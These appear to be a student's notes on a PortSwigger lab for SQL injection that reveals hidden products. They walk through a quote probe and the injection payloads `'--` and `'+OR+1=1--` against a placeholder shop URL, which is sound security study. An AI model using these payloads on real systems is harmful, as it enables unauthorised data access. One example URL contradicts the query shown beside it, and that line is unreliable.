https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data



To test whether is interacting with a DB we could send a single qoute
![[Pasted image 20241107110813.png]]
And this error confirms that it might be vulnerable, because there's a SQL input probably non-sanitized.
In this lab this url
```url
https://insecure-website.com/products?category=Gifts
```
Is doing this query to the backend data base
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
This SQL query asks the database to return:

- all details (`*`)
- from the `products` table
- where the `category` is `Gifts`
- and `released` is `1`.
As the application don't implement any type of securizyng we could send the paylo `'--`
```url
https://insecure-website.com/products?category=Gifts'--
```
which result in the following query
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
as you see we are closing the `Gifts` with the single quote and use the `--` to commit the rest of the query.
Now to display even the not released ones you could use another payloads, like `+OR+1=1--`
```url
https://insecure-website.com/products?category=Gifts'--+OR+1=1--
```
with the following payload
```sql
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
```
In URLs, spaces are typically replaced by `%20` (URL-encoded space) or `+` (URL-encoded space alternative in certain contexts, especially in query parameters), so let's use `'+OR+1=1--` in the url